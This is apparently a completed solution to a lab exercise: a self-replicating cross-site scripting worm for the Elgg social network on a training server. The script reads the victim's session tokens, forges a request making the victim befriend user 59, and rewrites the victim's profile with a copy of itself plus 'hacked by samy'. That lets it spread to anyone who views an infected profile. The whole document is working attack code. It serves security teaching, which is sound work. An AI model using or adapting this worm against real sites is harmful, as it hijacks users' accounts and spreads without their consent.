<script id=worm>
window.onload = function () {
var Ajax=null;

var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // (1)

var token="&__elgg_token="+elgg.security.token.__elgg_token; // (2)

// ADD SAMY AS FRIEND
//Construct the HTTP request to add Samy as a friend.
var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token + ts + token; //FILL IN
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.send();

// EDIT VICTIM PROFILE AND PROPAGATE
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var jsCode="<" + "script>" + document.getElementById("worm").innerHTML + "</" + "script><p>hacked by samy</p>";
var wormcode=encodeURIComponent(jsCode);
//var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
//var token="__elgg_token="+elgg.security.token.__elgg_token;
//Construct the content of your url.
var content=`${token}${ts}${userName}&description=${wormcode}${guid}`; //FILL IN
var samyGuid=59; //FILL IN
var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN

if(elgg.session.user.guid != samyGuid) {
//Create and send Ajax request to modify profile
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
// (1)
	Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
Ajax.send(content);
}

}
</script>
